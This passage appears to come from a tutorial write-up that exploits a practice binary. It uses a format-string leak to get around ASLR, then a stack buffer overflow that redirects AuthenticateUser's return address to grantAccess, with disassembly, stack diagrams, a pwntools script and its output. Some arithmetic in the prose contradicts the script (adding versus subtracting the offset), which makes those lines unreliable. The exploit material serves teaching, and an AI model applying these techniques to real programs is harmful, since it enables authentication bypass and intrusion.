</span></span><span style=display:flex><span>    1203:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> e5             	mov    rbp,rsp
</span></span><span style=display:flex><span>    1206:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>83</span> ec <span style=color:#ae81ff>20</span>          	sub    rsp,0x20
</span></span><span style=display:flex><span>    120a:	c7 <span style=color:#ae81ff>45</span> ec <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> 	mov    DWORD PTR <span style=color:#f92672>[</span>rbp-0x14<span style=color:#f92672>]</span>,0x0
</span></span><span style=display:flex><span>    1211:	<span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>05</span> <span style=color:#ae81ff>04</span> 0e <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> 	lea    rax,<span style=color:#f92672>[</span>rip+0xe04<span style=color:#f92672>]</span>        <span style=color:#75715e># 201c &lt;_IO_stdin_used+0x1c&gt;</span>
</span></span><span style=display:flex><span>    1218:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> c7             	mov    rdi,rax
</span></span><span style=display:flex><span>    121b:	b8 <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>       	mov    eax,0x0
</span></span><span style=display:flex><span>    1220:	e8 6b fe ff ff       	call   <span style=color:#ae81ff>1090</span> &lt;printf@plt&gt;
</span></span><span style=display:flex><span>    1225:	<span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>45</span> f0          	lea    rax,<span style=color:#f92672>[</span>rbp-0x10<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>    1229:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> c6             	mov    rsi,rax
</span></span><span style=display:flex><span>    122c:	<span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>05</span> fa 0d <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> 	lea    rax,<span style=color:#f92672>[</span>rip+0xdfa<span style=color:#f92672>]</span>        <span style=color:#75715e># 202d &lt;_IO_stdin_used+0x2d&gt;</span>
</span></span><span style=display:flex><span>    1233:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> c7             	mov    rdi,rax
</span></span><span style=display:flex><span>    1236:	b8 <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>       	mov    eax,0x0
</span></span><span style=display:flex><span>    123b:	e8 <span style=color:#ae81ff>70</span> fe ff ff       	call   10b0 &lt;__isoc99_scanf@plt&gt;
</span></span><span style=display:flex><span>    1240:	<span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>05</span> e9 0d <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> 	lea    rax,<span style=color:#f92672>[</span>rip+0xde9<span style=color:#f92672>]</span>        <span style=color:#75715e># 2030 &lt;_IO_stdin_used+0x30&gt;</span>
</span></span><span style=display:flex><span>    1247:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> c7             	mov    rdi,rax
</span></span><span style=display:flex><span>    124a:	b8 <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>       	mov    eax,0x0
</span></span><span style=display:flex><span>    124f:	e8 3c fe ff ff       	call   <span style=color:#ae81ff>1090</span> &lt;printf@plt&gt;
</span></span><span style=display:flex><span>    1254:	<span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>45</span> f0          	lea    rax,<span style=color:#f92672>[</span>rbp-0x10<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>    1258:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> c7             	mov    rdi,rax
</span></span><span style=display:flex><span>    125b:	b8 <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>       	mov    eax,0x0
</span></span><span style=display:flex><span>    1260:	e8 2b fe ff ff       	call   <span style=color:#ae81ff>1090</span> &lt;printf@plt&gt;
</span></span><span style=display:flex><span>    1265:	<span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>45</span> f8          	lea    rax,<span style=color:#f92672>[</span>rbp-0x8<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>    1269:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> c6             	mov    rsi,rax
</span></span><span style=display:flex><span>    126c:	<span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>05</span> ba 0d <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> 	lea    rax,<span style=color:#f92672>[</span>rip+0xdba<span style=color:#f92672>]</span>        <span style=color:#75715e># 202d &lt;_IO_stdin_used+0x2d&gt;</span>
</span></span><span style=display:flex><span>    1273:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> c7             	mov    rdi,rax
</span></span><span style=display:flex><span>    1276:	b8 <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>       	mov    eax,0x0
</span></span><span style=display:flex><span>    127b:	e8 <span style=color:#ae81ff>30</span> fe ff ff       	call   10b0 &lt;__isoc99_scanf@plt&gt;
</span></span><span style=display:flex><span>    1280:	<span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>55</span> ec          	lea    rdx,<span style=color:#f92672>[</span>rbp-0x14<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>    1284:	<span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>45</span> f8          	lea    rax,<span style=color:#f92672>[</span>rbp-0x8<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>    1288:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> d6             	mov    rsi,rdx
</span></span><span style=display:flex><span>    128b:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> c7             	mov    rdi,rax
</span></span><span style=display:flex><span>    128e:	e8 <span style=color:#ae81ff>30</span> ff ff ff       	call   11c3 &lt;checkPassword&gt;
</span></span><span style=display:flex><span>    1293:	8b <span style=color:#ae81ff>45</span> ec             	mov    eax,DWORD PTR <span style=color:#f92672>[</span>rbp-0x14<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>    1296:	<span style=color:#ae81ff>83</span> f8 <span style=color:#ae81ff>01</span>             	cmp    eax,0x1
</span></span><span style=display:flex><span>    1299:	<span style=color:#ae81ff>75</span> 0c                	jne    12a7 &lt;AuthenticateUser+0xa9&gt;
</span></span><span style=display:flex><span>    129b:	b8 <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>       	mov    eax,0x0
</span></span><span style=display:flex><span>    12a0:	e8 <span style=color:#ae81ff>04</span> ff ff ff       	call   11a9 &lt;grantAccess&gt;
</span></span><span style=display:flex><span>    12a5:	eb 0f                	jmp    12b6 &lt;AuthenticateUser+0xb8&gt;
</span></span><span style=display:flex><span>    12a7:	<span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>05</span> <span style=color:#ae81ff>97</span> 0d <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> 	lea    rax,<span style=color:#f92672>[</span>rip+0xd97<span style=color:#f92672>]</span>        <span style=color:#75715e># 2045 &lt;_IO_stdin_used+0x45&gt;</span>
</span></span><span style=display:flex><span>    12ae:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> c7             	mov    rdi,rax
</span></span><span style=display:flex><span>    12b1:	e8 ca fd ff ff       	call   <span style=color:#ae81ff>1080</span> &lt;puts@plt&gt;
</span></span><span style=display:flex><span>    12b6:	<span style=color:#ae81ff>90</span>                   	nop
</span></span><span style=display:flex><span>    12b7:	c9                   	leave
</span></span><span style=display:flex><span>    12b8:	c3                   	ret
</span></span></code></pre></div><p>We know the calling convention is to place first parameter in <code>rdi</code> and second parameter in <code>rsi</code>.</p><p>We can see in the first two <code>printf</code> calls, the value in <code>rdi</code> is taken from <code>.rodata</code> section. It uses RIP relative addressing here to point to the address of the hardcoded format strings.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>    122c:	<span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>05</span> fa 0d <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> 	lea    rax,<span style=color:#f92672>[</span>rip+0xdfa<span style=color:#f92672>]</span>        <span style=color:#75715e># 202d &lt;_IO_stdin_used+0x2d&gt;</span>
</span></span><span style=display:flex><span>    1233:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> c7             	mov    rdi,rax
</span></span><span style=display:flex><span>    1236:	b8 <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>       	mov    eax,0x0
</span></span><span style=display:flex><span>    123b:	e8 <span style=color:#ae81ff>70</span> fe ff ff       	call   10b0 &lt;__isoc99_scanf@plt&gt;
</span></span><span style=display:flex><span>    1240:	<span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>05</span> e9 0d <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> 	lea    rax,<span style=color:#f92672>[</span>rip+0xde9<span style=color:#f92672>]</span>        <span style=color:#75715e># 2030 &lt;_IO_stdin_used+0x30&gt;</span>
</span></span><span style=display:flex><span>    1247:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> c7             	mov    rdi,rax
</span></span><span style=display:flex><span>    124a:	b8 <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>       	mov    eax,0x0
</span></span><span style=display:flex><span>    124f:	e8 3c fe ff ff       	call   <span style=color:#ae81ff>1090</span> &lt;printf@plt&gt;
</span></span></code></pre></div><p>But in the third <code>printf</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>    1254:	<span style=color:#ae81ff>48</span> 8d <span style=color:#ae81ff>45</span> a0          	lea    rax,<span style=color:#f92672>[</span>rbp-0x10<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>    1258:	<span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> c7             	mov    rdi,rax
</span></span><span style=display:flex><span>    125b:	b8 <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>       	mov    eax,0x0
</span></span><span style=display:flex><span>    1260:	e8 2b fe ff ff       	call   <span style=color:#ae81ff>1090</span> &lt;printf@plt&gt;
</span></span></code></pre></div><p>We can see the adress written to <code>rdi</code> is relative to <code>rbp</code> which means its clearly on the stack and its the address of the <code>username</code> variable.</p><h3 id=exploit-1-leak-the-stack-adresses-and-replace-the-return-address-of-authenticateuser-to-grantaccess>Exploit 1: Leak the Stack Adresses and Replace the Return Address of <code>AuthenticateUser</code> to <code>grantAccess</code><a hidden class=anchor aria-hidden=true href=#exploit-1-leak-the-stack-adresses-and-replace-the-return-address-of-authenticateuser-to-grantaccess>#</a></h3><p>Let&rsquo;s visualize the stack layout:</p><pre tabindex=0><code>1206:	sub    rsp,0x20           # Allocate 32 bytes (0x20)
120a:	mov    DWORD PTR [rbp-0x14],0x0    # isAuthenticated
1225:	lea    rax,[rbp-0x10]              # username
1265:	lea    rax,[rbp-0x8]               # password
</code></pre><p><strong>Stack layout:</strong></p><pre tabindex=0><code>Higher addresses
┌──────────────────────┐
│ Return address       │ ← [rbp+8]  (0x12cb - points to main)
│ (0x55...12cb)        │    **WE WANT TO OVERWRITE THIS!**
├──────────────────────┤
│ Saved RBP            │ ← [rbp]    (8 bytes)
├──────────────────────┤
│ password[8]          │ ← [rbp-0x8]  (8 bytes from RBP)
├──────────────────────┤
│ username[8]          │ ← [rbp-0x10] (16 bytes from RBP)
├──────────────────────┤
│ isAuthenticated (4)  │ ← [rbp-0x14] (20 bytes from RBP)
├──────────────────────┤
│ padding (12 bytes)   │ ← [rbp-0x20] (unused, stack aligned)
└──────────────────────┘
Lower addresses
</code></pre><p>Total stack frame: 32 bytes (0x20)</p><h4 id=calculating-key-distances>Calculating Key Distances<a hidden class=anchor aria-hidden=true href=#calculating-key-distances>#</a></h4><h5 id=1-distance-of-password-from-saved-ra>1. Distance of Password From Saved RA<a hidden class=anchor aria-hidden=true href=#1-distance-of-password-from-saved-ra>#</a></h5><p>This is what we need to leak with format string vulnerability and overwrite it later</p><ul><li>username at <code>[rbp-0x10]</code></li><li>password at <code>[rbp-0x8]</code></li><li>return address at <code>[rbp+8]</code></li><li>Distance from username to return address: <code>0x10 + 8 = 24 bytes</code></li><li>Distance from password to return address: <code>0x8 + 8 = 16 bytes</code></li></ul><h5 id=2-the-actual-address-of-grantaccess>2. The Actual Address of <code>grantAccess</code><a hidden class=anchor aria-hidden=true href=#2-the-actual-address-of-grantaccess>#</a></h5><p>This is where we need to jump to using buffer overflow and the previous information leaked.</p><p>Now lets calculate the address of <code>grantAccess</code>: Since this is PIE + ASLR enabled binary and we are not using GDB, we need a creative way to find dynamic address of <code>grantAccess</code> function. One insight that we can recall is, even with PIE and ASLR enabled, the relative distance between the lines of code in <code>.text</code> section remains same.</p><pre tabindex=0><code>00000000000012b9 &lt;main&gt;:
    12b9:	f3 0f 1e fa          	endbr64
    12bd:	55                   	push   rbp
    12be:	48 89 e5             	mov    rbp,rsp
    12c1:	b8 00 00 00 00       	mov    eax,0x0
    12c6:	e8 33 ff ff ff       	call   11fe &lt;AuthenticateUser&gt;
    12cb:	b8 00 00 00 00       	mov    eax,0x0 -&gt; this is the return address of AuthenticateUser
    12d0:	5d                   	pop    rbp 
    12d1:	c3                   	ret
</code></pre><pre tabindex=0><code>Return address (leaked): 0x12cb
grantAccess:            0x11a9
Offset:                 0x12cb - 0x11a9 = 0x122 (290 bytes)
</code></pre><p>Since we would&rsquo;ve already leaked the return address in <code>main</code> using format string in our previous step,
we can add this offset of 290 bytes to get the actual address of <code>grantAccess</code>.</p><h5 id=3-correct-argument-to-leak-from-printf>3. Correct Argument to Leak From <code>printf</code><a hidden class=anchor aria-hidden=true href=#3-correct-argument-to-leak-from-printf>#</a></h5><p>When we call printf:</p><pre tabindex=0><code>call printf
</code></pre><p>Inside printf&rsquo;s perspective:</p><pre tabindex=0><code>Position 1-6: RDI, RSI, RDX, RCX, R8, R9 (registers)
Position 7:   [rsp]      ← First stack parameter
Position 8:   [rsp+8]    ← Second stack parameter
Position 9:   [rsp+16]   ← Third stack parameter
Position 10:  [rsp+24]
etc.
</code></pre><p>What the Compiler Generates:</p><pre tabindex=0><code># Caller (before call printf):
push arg8          # Push in reverse order
push arg7
mov r9, arg6       # Load registers
mov r8, arg5
mov rcx, arg4
mov rdx, arg3
mov rsi, arg2
mov rdi, arg1
call printf        # Now RSP points right at arg7!

# After printf returns:
add rsp, 16        # Clean up the 2 stack args (arg7, arg8)
</code></pre><p>Since callee is passing the variadic arguments, it will be located on the stack before the <code>printf</code>&rsquo;s stack frame is set up.</p><p>This is the stack frame just before <code>printf</code> is about to be called, the callee has pushed the variadic arguments ot stack (in this case its not) and saved the return adddress to callee. The printf&rsquo;s prologue has not been executed yet. Since the variadic argument <code>va_list</code> is already present on stack, we can guarantee that <code>printf</code>&rsquo;s <code>arg_ptr</code> starts scanning arguments from there and the actual stack frame of <code>printf</code> doesn&rsquo;t even matter.</p><pre tabindex=0><code>Higher addresses
┌──────────────────────┐
│ Return to main       │  ← AuthenticateUser return addr (TARGET)
├──────────────────────┤
│ Saved RBP            │
├──────────────────────┤
│ password[8]          │
├──────────────────────┤
│ username[8]          │
├──────────────────────┤
│ isAuthenticated +    │
│ padding              │
├──────────────────────┤
│ va_list              │  ← printf&#39;s arg_ptr starts, here, it will look like [rbp+8] in printf&#39;s assembly
├──────────────────────┤
│ return address to.   |
| AuthenticateUser.    │  ← [rsp] of AuthenticateUser 
└──────────────────────┘
Lower addresses
</code></pre><p>By looking at the <a href=#exploit-1-leak-the-stack-adresses-and-relace-the-return-address-of-authenticateuser-to-grantaccess>stack</a> we built previously. We can see we ened to move the <code>printf</code>&rsquo;s <code>arg_ptr</code> 5 times. So considering 6 register arguments, we get 6 + 5 = 11. So we need to leak the 12th value in what printf thinks is a value to format string.</p><p>We can use <code>%p</code> to print the addresses with <code>0x</code> prefix. If we add <code>%p</code> 11 times, we will leak the 11th argument.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>sanketh@sanketh-81de:$ ./vuln
</span></span><span style=display:flex><span>Enter Username: %p%p%p%p%p%p%p%p%p%p%p
</span></span><span style=display:flex><span>Enter password <span style=color:#66d9ef>for</span>: 0x7ffded20f2c0<span style=color:#f92672>(</span>nil<span style=color:#f92672>)(</span>nil<span style=color:#f92672>)</span>0xa0xffffffff<span style=color:#f92672>(</span>nil<span style=color:#f92672>)(</span>nil<span style=color:#f92672>)</span>0x70257025702570250x70257025702570250x7025702570250x5d61a35072cb^C
</span></span><span style=display:flex><span>sanketh@sanketh-81de:$ ./vuln
</span></span><span style=display:flex><span>Enter Username: %p%p%p%p%p%p%p%p%p%p%p
</span></span><span style=display:flex><span>Enter password <span style=color:#66d9ef>for</span>: 0x7ffeb89c1e40<span style=color:#f92672>(</span>nil<span style=color:#f92672>)(</span>nil<span style=color:#f92672>)</span>0xa0xffffffff<span style=color:#f92672>(</span>nil<span style=color:#f92672>)(</span>nil<span style=color:#f92672>)</span>0x70257025702570250x70257025702570250x7025702570250x5ce761ba72cb^C
</span></span><span style=display:flex><span>sanketh@sanketh-81de:$ ./vuln
</span></span><span style=display:flex><span>Enter Username: %p%p%p%p%p%p%p%p%p%p%p
</span></span><span style=display:flex><span>Enter password <span style=color:#66d9ef>for</span>: 0x7ffe874444d0<span style=color:#f92672>(</span>nil<span style=color:#f92672>)(</span>nil<span style=color:#f92672>)</span>0xa0xffffffff<span style=color:#f92672>(</span>nil<span style=color:#f92672>)(</span>nil<span style=color:#f92672>)</span>0x70257025702570250x70257025702570250x7025702570250x5ca4fddfe2cb^C
</span></span><span style=display:flex><span>sanketh@sanketh-81de:$ ./vuln
</span></span><span style=display:flex><span>Enter Username: %p%p%p%p%p%p%p%p%p%p%p
</span></span><span style=display:flex><span>Enter password <span style=color:#66d9ef>for</span>: 0x7ffd4ef49d80<span style=color:#f92672>(</span>nil<span style=color:#f92672>)(</span>nil<span style=color:#f92672>)</span>0xa0xffffffff<span style=color:#f92672>(</span>nil<span style=color:#f92672>)(</span>nil<span style=color:#f92672>)</span>0x70257025702570250x70257025702570250x7025702570250x651533b3e2cb^C
</span></span></code></pre></div><p>We can see even with ASLR, our return address consistenly ends with <code>2cb</code>. In fact even the static address on binary showed the address ending with <code>2cb</code>.</p><pre tabindex=0><code>    12cb:	b8 00 00 00 00       	mov    eax,0x0 -&gt; this is the return address of AuthenticateUser
</code></pre><p>The important observation here is, the last 3 nibbles remains unchanged even after ASLR!</p><p>Its because of the page alignment
• Page size = <code>4096 bytes</code> = <code>0x1000</code>
• That means the lowest 12 bits are always zero</p><p>So the constant offset ASLR will be adding has to be a multiple of <code>4096</code> which means last 3 nibbles are always 0. Otherwise it would disturb the page layout of segments.</p><p>We can use this as to double confirm we&rsquo;re headed in the right direction. Or we can also do rough calculation and leak a set of addresses around our estimate and look for the one ending with expected last 12 bits.</p><p>Sometimes we may not have space to tpe enough <code>%p</code>&rsquo;s, the content itself might overflow and end up overwriting the return address which will simply crash the program. There is another we can print any argument with just 8 bytes of input</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>Enter Username: %11$p
</span></span><span style=display:flex><span>Enter password <span style=color:#66d9ef>for</span>: 0x5a45b5b602cb
</span></span></code></pre></div><p>This will directly take us to the 11th parameter.</p><h4 id=building-the-payload-for-buffer-overflow>Building the Payload for Buffer Overflow<a hidden class=anchor aria-hidden=true href=#building-the-payload-for-buffer-overflow>#</a></h4><p>Let&rsquo;s consider this execution</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>$ ./vuln
</span></span><span style=display:flex><span>Enter Username: %11$p
</span></span><span style=display:flex><span>Enter password <span style=color:#66d9ef>for</span>: 0x5a45b5b602cb
</span></span></code></pre></div><p>From our earlier calculation we deduced that the address of <code>grantAccess</code> is 290 bytes below the address of return address to main. Using that we can do <code>0x5a45b5b602cb + 0x122 = 0x0x5a45b5b603ed</code></p><p>But the problem is we cannot send a raw bytestring as input from <code>stdin</code>. Because the ascii representation of some of these bytes are not even printable. So we pass it using script.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> re
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;[*] Launching process&#34;</span>)
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> process(<span style=color:#e6db74>&#34;./vuln&#34;</span>, stdin<span style=color:#f92672>=</span>PTY, stdout<span style=color:#f92672>=</span>PTY)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;[*] Waiting for &#39;Enter Username:&#39;&#34;</span>)
</span></span><span style=display:flex><span>data <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;Enter Username: &#34;</span>, timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span>)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;[DEBUG] Received so far:</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>{</span>data<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;[*] Sending format string&#34;</span>)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;%11$p&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;[*] Waiting for &#39;Enter password for:&#39;&#34;</span>)
</span></span><span style=display:flex><span>data <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;Enter password for: &#34;</span>, timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span>)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;[DEBUG] Received so far:</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>{</span>data<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;[*] Attempting to read leaked pointer&#34;</span>)
</span></span><span style=display:flex><span>leak_line <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recv(timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span>)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;[DEBUG] Raw leak bytes: </span><span style=color:#e6db74>{</span>leak_line<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Try extracting address safely</span>
</span></span><span style=display:flex><span>m <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>rb</span><span style=color:#e6db74>&#34;0x[0-9a-fA-F]+&#34;</span>, leak_line)
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> m:
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;[!] Failed to find leaked address!&#34;</span>)
</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>interactive()
</span></span><span style=display:flex><span>    exit(<span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>leak <span style=color:#f92672>=</span> int(m<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>0</span>), <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;[+] Leaked return address: </span><span style=color:#e6db74>{</span>hex(leak)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;[*] Calculating grantAccess&#34;</span>)
</span></span><span style=display:flex><span>grant_access <span style=color:#f92672>=</span> leak <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x122</span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;[+] grantAccess = </span><span style=color:#e6db74>{</span>hex(grant_access)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;[*] Building payload&#34;</span>)
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;A&#34;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>8</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;B&#34;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>8</span> <span style=color:#f92672>+</span> p64(grant_access)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;[DEBUG] Payload length: </span><span style=color:#e6db74>{</span>len(payload)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;[DEBUG] Payload bytes: </span><span style=color:#e6db74>{</span>payload<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;[*] Sending password payload&#34;</span>)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;[*] Reading remaining output&#34;</span>)
</span></span><span style=display:flex><span>out <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvall(timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>print(out<span style=color:#f92672>.</span>decode(errors<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;ignore&#34;</span>))
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>$ python3 pwn_payload3.py
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Launching process
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Starting local process <span style=color:#e6db74>&#39;./vuln&#39;</span> argv<span style=color:#f92672>=[</span>b<span style=color:#e6db74>&#39;./vuln&#39;</span><span style=color:#f92672>]</span> : pid <span style=color:#ae81ff>3536</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Waiting <span style=color:#66d9ef>for</span> <span style=color:#e6db74>&#39;Enter Username:&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DEBUG<span style=color:#f92672>]</span> Received 0x10 bytes:
</span></span><span style=display:flex><span>    b<span style=color:#e6db74>&#39;Enter Username: &#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DEBUG<span style=color:#f92672>]</span> Received so far:
</span></span><span style=display:flex><span>b<span style=color:#e6db74>&#39;Enter Username: &#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Sending format string
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DEBUG<span style=color:#f92672>]</span> Sent 0x6 bytes:
</span></span><span style=display:flex><span>    b<span style=color:#e6db74>&#39;%11$p\n&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Waiting <span style=color:#66d9ef>for</span> <span style=color:#e6db74>&#39;Enter password for:&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DEBUG<span style=color:#f92672>]</span> Received 0x22 bytes:
</span></span><span style=display:flex><span>    b<span style=color:#e6db74>&#39;Enter password for: 0x55bbc51d72cb&#39;</span>
